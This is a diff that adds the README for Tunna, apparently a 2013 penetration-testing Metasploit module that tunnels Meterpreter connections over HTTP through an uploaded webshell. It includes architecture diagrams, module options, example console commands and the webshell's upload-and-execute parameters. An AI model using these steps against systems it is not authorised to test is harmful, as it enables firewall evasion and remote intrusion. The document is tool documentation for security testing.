@@ -1,0 +1,323 @@
+v0.1a	Pre-alpha version
+
+					  _____                        
+					 |_   _|   _ _ __  _ __   __ _ 
+					   | || | | | '_ \| '_ \ / _` |
+					   | || |_| | | | | | | | (_| |
+					   |_| \__,_|_| |_|_| |_|\__,_|	
+								   METASPLOIT MODULE
+ 
+                     Tunna 0.1, for HTTP tunneling TCP connections by Nikos Vassakis
+                     http://www.secforce.co.uk	/ nikos.vassakis <at> secforce.com
+
+
+################################################################################################################
+
+High level Diagram:
+
+ +-------------------------------------------+                     +-------------------------------------------+
+ | Local Host                                |                     | Remote Host                               |
+ |-------------------------------------------|                     |-------------------------------------------|
+ |   +-------------------------------+       |   +-------------+   |   +------------+        +----------+      |
+ |   |      Metasploit Module        |<==========|  Firewall   |======>|  Webshell  |+------>|Server App|      |
+ |   +-------------------------------+       |   +-------------+   |   +------------+        +----------+      |
+ +-------------------------------------------+                     +------------------------------------------ +
+
+
+Technical Diagram:
+
+ +-------------------------------------------+                     +-------------------------------------------+
+ | Local Host (*Needs to be set as RHOST)    |                     | Remote Host                               |
+ |-------------------------------------------|                     |-------------------------------------------|
+ |                                           |                     |                                           |
+ |                   +-----------------+     |                     |     +-----------------+                   |
+ |                   |   METASPLOIT    |     |                     |     | Web Shell (URL) |                   |
+ |                   |-----------------|     |                     |     |-----------------|                   |
+ |                   | +-------------+ |     |                     |     |                 |                   |
+ |                   | |HTTP encap.  | |     |   HTTP Traffic      |     |  +-----------+  |                   |
+ |                   | +------^------+ <=================================>  |HTTP-->Sock|  |                   |
+ |                   |        |        |     |                     |     |  +-----+-----+  |                   |
+ |                   | +------+------+ |     |                     |     |        |        |                   |
+ |                   | |  Local Port | |     |                     |     +--------v--------+                   |
+ |                   | +------^------+ |     |                     |              |                            |
+ |                   |        |        |     |                     |              |                            |
+ |                   | +------+------+ |     |                     |              |        +----------------+  |
+ |                   | |   HANDLER   | |     |                     |              +--------> Remote PAYLOAD |  |
+ |                   | +-------------+ |     |                     |                       |----------------|  |
+ |                   +-----------------+     |                     |                       |Connection      |  |
+ |                                           |                     |                       |received from   |  |
+ |                                           |                     |                       |localhost       |  |
+ |                                           |                     |                       |                |  |
+ |                                           |                     |                       |                |  |
+ |                                           |                     |                       +----------------+  |
+ +-------------------------------------------+                     +-------------------------------------------+
+
+
+SUMMARY
+=======
+
+	TLDR: Tunnels Metasploit Payload (TCP) connections over HTTP
+
+In a fully firewalled (inbound and outbound connections restricted - except the webserver port)
+
+The exploit generates the payload, uploads it to the server and executes it using the webshell.
+
+The webshell is used to connect to the payload running on the remote host. 
+This would be a local connection on a local port at the remote host and *should* be allowed by the firewall.
+
+The webshell will read data from the payload port wrap them over HTTP and send it as an HTTP response to the
+metasploit "proxy".
+
+The local metasploit "proxy" will unwrap and write the data to its local port where the payload handler 
+is connected.
+
+When the metasploit "proxy" receives data on the local port, it will send them over to the webshell 
+as a HTTP Post.
+
+The webshell will read the data from the HTTP Post and put them on the payload port
+
+and repeat --^
+
+Only the webserver port needs to be open (typically 80 - *not really tested over 443 SSL)
+The whole communication (Externally) is done over the HTTP protocol
+
+USAGE
+======
+
+Module options (exploit/windows/misc/http_prx_exploit):
+
+   Name          Current Setting                  Required  Description
+   ----          ---------------                  --------  -----------
+   LPORT         4444                             no        port for local server (Handler listener)
+   PingInterval  0.5                              no        HTTP request for data, pinging interval
+** RHOST         10.3.3.7                        yes       !IMPORTANT local external IP
+   RPORT         4444                             no        remote port of service for the webshell 
+									to connect to (remote meterpreter)
+   TARGETURI     http://webserver:80/conn.ext	 yes       PATH to conn.php / conn.aspx / conn.jsp
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LPORT     4444             yes       The listen port
+   RHOST     10.3.3.7         no        The target address
+
+
+Module advanced options:
+
+   Name           : BufferSize **
+   Current Setting: 8192
+   Description    : HTTP request size (some webshels have limitations on the size)
+
+   Name           : RemoteAddress
+   Current Setting: 127.0.0.1
+   Description    : address for remote webshell to connect to (beta)
+
+   Name           : ReqTimeout
+   Current Setting: 300
+   Description    : HTTP request timeout in milliseconds
+
+   Name           : StartPing
+   Current Setting: false
+   Description    : start the pinging thread first - some services send data first (SSH)
+
+   Name           : VERBOSE
+   Current Setting: false
+   Description    : Enable detailed status messages
+
+
+example usage:
+	use exploit/windows/misc/http_prx_exploit
+	set PAYLOAD windows/meterpreter/bind_tcp 
+	set VERBOSE true
+	set RHOST 10.3.3.7
+	set TARGETURI http://10.3.3.1/conn.aspx
+	
+**	exploit -j
+
+wait for session 
+	sessions -i $(session number)	
+
+** See Limitations 
+
+Prerequisites
+=============
+	Copy the exploit file at ~/.msf4/modules/exploits/windows/misc/http_prx_exploit.rb
+	or
+	Copy the exploit file at ~/.msf4/modules/exploits/linux/misc/http_prx_exploit.rb
+	or wherever
+
+	The ability to upload a webshell on the remote server
+
+
+LIMITATIONS / KNOWN BUGS / HACKS
+================================
+	
+	This is a POC code and might cause DoS of the server.
+		All efforts to clean up after execution or on error have been made ... no promises
+		There are some known bugs
+
+	Important!:
+		* It needs to be run as a job (exploit -j)
+			otherwise the socket threads get killed (program exits) when the handler is executed
+		* There is a bug in metasploit and local sockets - Bug #7760
+			Affected the development of the module greatly
+			! RHOST needs to be set to the local external IP or won't work
+			LPORT: a local available port for the metasploit handler needs to be set as well 
+
+		* RHOST: when overloaded (in code) the handler couldn't connect.
+		* Theoretically reverse payloads can be used (UNTESTED and not recommended)
+			but StartPing needs to be set to TRUE
+		* The correct PAYLOAD for the remote OS should be selected
+		* Sometimes the pinging thread doesn't get killed - better to close the remote connection 1st 
+
+	Based on local tests: 	
+		* Most tests done with PAYLOAD (but others should work):
+			windows/meterpreter/bind_tcp	
+			and
+			linux/x86/meterpreter/bind_tcp
+			
+		* JSP buffer needs to be limited (BufferSize option):
+				4096 worked in Linux Apache Tomcat
+				1024 worked in XAMPP Apache Tomcat (slow)
+				* More than that created problems with bytes missing at the remote socket
+				eg: set BufferSize 1024
+
+		* Sockets not enabled by default php windows (IIS + PHP)
+		
+		* Return cariages on webshells (outside the code): 
+			get sent on responses / get written on local socket --> corrupt the packets
+
+		* PHP webshell for windows: the loop function DoS'es the remote socket: 
+			sleep function added -> works but a bit slow
+
+	
+FILES
+=====
+
+	Webshells:
+		conn.jsp		Tested on Apache Tomcat (windows + linux)
+		conn.aspx		Tested on IIS 6+8 (windows server 2003/2012) 
+		conn.php		Tested on LAMP + XAMPP + IIS (windows + linux)
+
+	Module:
+		http_prx_exploit.rb	Tested in backtrack 5 / metasploit v4.3.0-dev [core:4.3 api:1.0]
+
+
+Technical Details
+=================
+	* The code is in a Pre-alpha dev stage:
+		more work with the exceptions & at exit cleanup is needed
+
+
+ Architecture descisions
+ -----------------------
+	Have the all the code included in one module
+		Also tried to make it a handler module but this works better
+
+	Tried to use Metasploits API as much as possible
+	
+	Local port is needed for handler connection
+		Internal (double) socket was not possible
+
+	VERBOSE ouput that gets restricted when meterpreter is connected
+
+	General:	
+	Data is sent raw in the HTTP Post Body (no post variable)
+		To save a couple of bytes
+
+	Instructions / configuration is sent to the webshell as URL parameters (HTTP Get)
+	Data is sent in the HTTP body (HTTP Post)
+
+	Websockets not used: Not supported by default by most of webservers (Maybe futrure dev)
+	Asyncronous HTTP responses not really possible
+		Proxy queries the server constantly (default 0.5 seconds)
+
+
+ INITIATION PHASE
+ ----------------
+1st packet initiates a session with the webshell - gets a cookie back
+	eg: http://webserver/conn.ext?proxy 	
+
+Based on the specified payload an executable gets generated (masfpayload code)
+	It gets uploaded to the webservers temp directory on the remote host
+	It gets executed by the webserver
+
+2nd packet sends connection configuration options to the webshell
+	eg: http://webserver/conn.ext?proxy&port=4444&ip=127.0.0.1
+	
+	IP and port of the payload for the webshell to connect to
+	This is a threaded request:
+		In php this request will go into an infinate loop 
+		to keep the webshell socket connection alive
+		In other webshells [OK] is received back
+
+ PROXY
+ -----
+The handler is called with the localhost(RHOST)/LPORT settings
+Typically the handler connects to the local socket and sends the payload stage
+session is created on the background
+to interact with the session: sessions -i $(session number)
+
+Once the handler is connected the pinging thread is initiated and execution starts.
+
+Any data on the socket (from the client) get read and get sent as a HTTP Post request
+Any data on the webshell socket get sent as a response to the POST request
+
+ PINGING THREAD
+ --------------
+Because HTTP responses cannot be asyncronous. 
+This thread will do HTTP Get requests on the webshell based on an interval (default 0.5 sec)
+If the webshell has data to send, it will (also) send it as a reply to this request
+Otherwise it sends an empty response
+
+In general:
+	Data from the local proxy get send with HTTP Post
+	There are Get requests every 0.5 sec to query the webshell for data
+	If there is data on the webshell side get send over as a response to one of these requests	
+
+ WEBSHELL
+ --------
+if url parameter file&upload is set it reads the executable and stores it on the temp
+if url parameter file&run is received: runs the executable
+	In linux chmod +x is needed
+if url parameter file&delete: deletes the executable (at exit)
+The webshell connects to the payload socket on the local host. 
+Any data written on the socket get sent back to the proxy as a reply to a request (POST/GET)
+Any data received with a post get written to the socket.
+
+ NOTES
+ -----
+All requests need to have the URL parameter "proxy" set to be handled by the webshell
+	(http://webserver/conn.ext?proxy)
+
+ AT EXIT / AT ERROR
+ ------------------
+Tries to kill all threads and close socket
+	* Doesn't always work as expected
+Sends proxy&close to webshell:
+	Kills remote threads and closes socket	
+
+COPYRIGHT & DISCLAIMER
+======================
+
+Tunna, TCP Tunneling Over HTTP - METASPLOIT MODULE
+Nikos Vassakis
+Copyright (C) 2013 SECFORCE.
+
+This tool is for legal purposes only.
+
+This program is free software: you can redistribute it and/or modify it 
+under the terms of the GNU General Public License as published by the 
+Free Software Foundation, either version 3 of the License, or (at your 
+option) any later version.
+
+This program is distributed in the hope that it will be useful, but
+WITHOUT ANY WARRANTY; without even the implied warranty of 
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General 
+Public License for more details.
+
+You should have received a copy of the GNU General Public License along 
+with this program. If not, see <http://www.gnu.org/licenses/>.
